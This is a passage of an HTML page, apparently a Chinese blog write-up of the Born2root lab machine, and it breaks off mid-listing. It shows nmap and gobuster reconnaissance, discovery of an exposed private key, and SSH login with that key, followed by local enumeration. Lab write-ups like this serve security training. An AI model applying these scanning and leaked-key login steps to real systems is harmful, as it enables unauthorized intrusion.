@@ -1,0 +1,771 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="I3eg1nner">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Born2root 靶机信息收集1234567891011121314┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;born2root]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.135Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-17 11:49 EDTNmap scan repor">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Born2root 靶机">
+<meta property="og:url" content="https://i3eg1nner.github.io/2023/08/f7491954730f.html">
+<meta property="og:site_name" content="I3eg1nner&#39;s blog">
+<meta property="og:description" content="Born2root 靶机信息收集1234567891011121314┌──(kali㉿kali)-[~&#x2F;Downloads&#x2F;born2root]└─$ sudo nmap --min-rate 10000 -p- 192.168.56.135Starting Nmap 7.94 ( https:&#x2F;&#x2F;nmap.org ) at 2023-08-17 11:49 EDTNmap scan repor">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/91d99b2f8bac5f01e9082222e2987249_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/e41fa5afa47a5757790524ef9369f07f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/46967f2cca31ac14982b711a6eb32a4d_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/7ebd8bf5dadfb36f9ae47d9144e52b79_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/96c81f72088661f56e1736c6413efb00_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/a471492f166c90d041730281da12a73f_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/376b981e22b04dd754bc9ec20a360761_MD5.png">
+<meta property="og:image" content="https://i3eg1nner.github.io/pic/b464495be96112fd829e5aff215607b2_MD5.png">
+<meta property="article:published_time" content="2023-08-19T19:00:35.000Z">
+<meta property="article:modified_time" content="2023-08-19T21:17:12.543Z">
+<meta property="article:author" content="I3eg1nner">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i3eg1nner.github.io/pic/91d99b2f8bac5f01e9082222e2987249_MD5.png">
+  
+  
+  
+  <title>Born2root 靶机 - I3eg1nner&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"i3eg1nner.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>I3eg1nner</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Born2root 靶机"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-20 03:00" pubdate>
+          2023年8月20日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          19k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          156 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Born2root 靶机</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Born2root-靶机"><a href="#Born2root-靶机" class="headerlink" title="Born2root 靶机"></a>Born2root 靶机</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap --min-rate 10000 -p- 192.168.56.135<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 11:49 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.135<br>Host is up (0.00091s latency).<br>Not shown: 65531 closed tcp ports (reset)<br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>111/tcp   open  rpcbind<br>46650/tcp open  unknown<br>MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 9.82 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放了 22,80,111,56650 端口，接下来进行版本探测</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80,111,46650 192.168.56.135     <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 11:50 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.135<br>Host is up (0.00047s latency).<br><br>PORT      STATE SERVICE VERSION<br>22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   1024 3d:6f:40:88:76:6a:1d:a1:fd:91:0f:dc:86:b7:81:13 (DSA)<br>|   2048 eb:29:c0:cb:eb:9a:0b:52:e7:9c:c4:a6:67:dc:33:e1 (RSA)<br>|   256 d4:02:99:b0:e7:7d:40:18:64:<span class="hljs-built_in">df</span>:3b:28:5b:9e:f9:07 (ECDSA)<br>|_  256 e9:c4:0c:6d:4b:15:4a:58:4f:69:<span class="hljs-built_in">cd</span>:<span class="hljs-built_in">df</span>:13:76:32:4e (ED25519)<br>80/tcp    open  http    Apache httpd 2.4.10 ((Debian))<br>|_http-title:  Secretsec Company <br>| http-robots.txt: 2 disallowed entries <br>|_/wordpress-blog /files<br>|_http-server-header: Apache/2.4.10 (Debian)<br>111/tcp   open  rpcbind 2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100024  1          46371/udp6  status<br>|   100024  1          46650/tcp   status<br>|   100024  1          48871/udp   status<br>|_  100024  1          49219/tcp6  status<br>46650/tcp open  status  1 (RPC <span class="hljs-comment">#100024)</span><br>MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 19.60 seconds<br></code></pre></td></tr></table></figure>
+
+<p>有价值的信息不多，提取一下：Debian 操作系统，<code>OpenSSH 6.7</code>，<code>robots.txt</code>（含两个目录信息），<code>Apache httpd 2.4.10</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap --script=vuln -p22,80,111,46650 192.168.56.135 <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 12:15 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos: <br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.135<br>Host is up (0.00035s latency).<br><br>PORT      STATE SERVICE<br>22/tcp    open  ssh<br>80/tcp    open  http<br>|_http-csrf: Couldn\<span class="hljs-string">&#x27;t find any CSRF vulnerabilities.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn\&#x27;</span>t find any DOM based XSS.<br>|_http-stored-xss: Couldn\<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string">| http-enum: </span><br><span class="hljs-string">|   /robots.txt: Robots file</span><br><span class="hljs-string">|   /files/: Potentially interesting directory w/ listing on &#x27;</span>apache/2.4.10 (debian)<span class="hljs-string">&#x27;</span><br><span class="hljs-string">|   /icons/: Potentially interesting folder w/ directory listing</span><br><span class="hljs-string">|_  /manual/: Potentially interesting folder</span><br><span class="hljs-string">111/tcp   open  rpcbind</span><br><span class="hljs-string">46650/tcp open  unknown</span><br><span class="hljs-string">MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 61.72 seconds</span><br></code></pre></td></tr></table></figure>
+
+<p>漏洞脚本扫描的结果中多了两个目录 <code>\icons</code> <code>\manual</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo nmap --top-ports 20 -sU 192.168.56.135              <br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-17 12:27 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> secretsec.com (192.168.56.135)<br>Host is up (0.0037s latency).<br><br>PORT      STATE         SERVICE<br>53/udp    closed        domain<br>67/udp    open|filtered dhcps<br>68/udp    open|filtered dhcpc<br>69/udp    open|filtered tftp<br>123/udp   closed        ntp<br>135/udp   open|filtered msrpc<br>137/udp   closed        netbios-ns<br>138/udp   closed        netbios-dgm<br>139/udp   closed        netbios-ssn<br>161/udp   closed        snmp<br>162/udp   open|filtered snmptrap<br>445/udp   closed        microsoft-ds<br>500/udp   open|filtered isakmp<br>514/udp   closed        syslog<br>520/udp   closed        route<br>631/udp   closed        ipp<br>1434/udp  open|filtered ms-sql-m<br>1900/udp  open|filtered upnp<br>4500/udp  open|filtered nat-t-ike<br>49152/udp closed        unknown<br>MAC Address: 08:00:27:81:98:42 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 8.01 seconds<br></code></pre></td></tr></table></figure>
+
+<h2 id="Web-渗透"><a href="#Web-渗透" class="headerlink" title="Web 渗透"></a>Web 渗透</h2><p>UDP 扫描结果没收获，接下来进入 Web 界面进行查看，同时进行目录爆破。首页是一些公司相关信息和人名信息，使用 cewl 工具收集信息。</p>
+<p><img src="/pic/91d99b2f8bac5f01e9082222e2987249_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.135 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,rar,txt,zip,sql<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.135<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              zip,sql,php,rar,txt<br>[+] Timeout:                 10s<br>===============================================================<br>2023/08/17 16:18:46 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/icons                (Status: 301) [Size: 316] [--&gt; http://192.168.56.135/icons/]<br>/files                (Status: 301) [Size: 316] [--&gt; http://192.168.56.135/files/]<br>/manual               (Status: 301) [Size: 317] [--&gt; http://192.168.56.135/manual/]<br>/robots.txt           (Status: 200) [Size: 57]<br>/server-status        (Status: 403) [Size: 302]<br>Progress: 1322350 / 1323366 (99.92%)<br>===============================================================<br>2023/08/17 16:23:13 Finished<br>===============================================================<br></code></pre></td></tr></table></figure>
+
+<p>没有新的暴露的信息，继续查看 Web 界面，先看看 <code>robots.txt</code> 有两个路径分别查看</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">User-agent</span><span class="hljs-punctuation">: </span>*<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/wordpress-blog<br><span class="hljs-attribute">Disallow</span><span class="hljs-punctuation">: </span>/files<br></code></pre></td></tr></table></figure>
+
+<p>似乎被嘲讽了，不过还是得把图片保存下来，因为图看起来缺了一部分，需要查查有没有问题</p>
+<p><img src="/pic/e41fa5afa47a5757790524ef9369f07f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用 strings, file, exiftool, binwalk 均未发现异常（由于信息太多，这里仅列出以下一部分）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ file index.jpeg <br>index.jpeg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, comment: <span class="hljs-string">&quot;CREATOR: gd-jpeg v1.0 (using IJG JPEG v62), quality = 100&quot;</span>, baseline, precision 8, 850x315, components 3<br></code></pre></td></tr></table></figure>
+
+<p>修改图片高度</p>
+<p><img src="/pic/46967f2cca31ac14982b711a6eb32a4d_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="私钥泄露"><a href="#私钥泄露" class="headerlink" title="私钥泄露"></a>私钥泄露</h2><p>还尝试了搜一搜原图，依然没收获，可能这张图本来就是这样吧。还尝试了对 <code>wordpress-blog</code> 进行了目录爆破，依然没收获。继续看看别的目录。</p>
+<p><img src="/pic/7ebd8bf5dadfb36f9ae47d9144e52b79_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>有点奇怪，下载下来看看</p>
+<p><img src="/pic/96c81f72088661f56e1736c6413efb00_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>看起来似乎是私钥，将其写入本地文件中，修改权限为 600，尝试使用 ssh 登录，用户名的话，首页信息中看到了联系人的邮箱名字，先使用这个进行尝试吧。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ sudo ssh -i privatekey martin@192.168.56.135                      <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>The authenticity of host <span class="hljs-string">&#x27;192.168.56.135 (192.168.56.135)&#x27;</span> can\<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:y7AzR/QI4CJW3DLNEfBYopBbKkUP12PZv3vt+1ZQP6E.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.56.135<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">sign_and_send_pubkey: no mutual signature supported</span><br><span class="hljs-string">martin@192.168.56.135\&#x27;</span>s password: <br><br>Permission denied, please try again.<br>martin@192.168.56.135\<span class="hljs-string">&#x27;s password</span><br></code></pre></td></tr></table></figure>
+
+<p>依然要输密码，不过情况看起来可能是算法不匹配的问题 <code>sign_and_send_pubkey: no mutual signature supported</code>，尝试直接谷歌搜索这个</p>
+<p><img src="/pic/a471492f166c90d041730281da12a73f_MD5.png" srcset="/img/loading.gif" lazyload></p>
+<p>翻找了一下找到了答案，不过这里更好地处理方法是增加 ssh 参数，然后进行分析判断</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">debug1: Next authentication method: publickey<br>debug1: Trying private key: privatekey<br>sign_and_send_pubkey: no mutual signature supported<br>debug2: we did not send a packet, <span class="hljs-built_in">disable</span> method<br>debug1: Next authentication method: password<br>martin@192.168.56.135<span class="hljs-string">&#x27;s password:</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/born2root]<br>└─$ ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i privatekey martin@192.168.56.135                   <br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Fri Jun  9 20:31:29 2017 from 192.168.0.42<br><br>READY TO ACCESS THE SECRET LAB ? <br><br>secret password : ^CTraceback (most recent call last):<br>  File <span class="hljs-string">&quot;/var/tmp/login.py&quot;</span>, line 8, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    password = raw_input(<span class="hljs-string">&quot;secret password : &quot;</span>)<br>KeyboardInterrupt<br>martin@debian:~$ <span class="hljs-built_in">whoami</span><br>martin<br>martin@debian:~$ <span class="hljs-built_in">id</span><br>uid=1001(martin) gid=1001(martin) groupes=1001(martin)<br>martin@debian:~$ w<br> 00:28:02 up  6:43,  1 user,  load average: 0,00, 0,01, 0,08<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>martin   pts/0    192.168.56.106   00:26    1.00s  0.05s  0.00s w<br>martin@debian:~$ <span class="hljs-built_in">id</span><br>uid=1001(martin) gid=1001(martin) groupes=1001(martin)<br>martin@debian:~$ sudo -l<br>-bash: sudo : commande introuvable<br>martin@debian:~$ <span class="hljs-built_in">uname</span> -a<br>Linux debian 3.16.0-4-586 <span class="hljs-comment">#1 Debian 3.16.39-1+deb8u2 (2017-03-07) i686 GNU/Linux</span><br>martin@debian:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:81:98:42 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.135/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe81:9842/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>martin@debian:~$ <span class="hljs-built_in">ls</span> -alih<br>total 28K<br>128334 drwxr-xr-x 3 martin martin 4,0K juin   8  2017 .<br>128262 drwxr-xr-x 5 root   root   4,0K juin   9  2017 ..<br>128341 -rw------- 1 martin martin  613 août  18 00:28 .bash_history<br>128335 -rw-r--r-- 1 martin martin  220 juin   7  2017 .bash_logout<br>128337 -rwx--x--x 1 martin martin 3,5K juin   7  2017 .bashrc<br>128336 -rw-r--r-- 1 martin martin  675 juin   7  2017 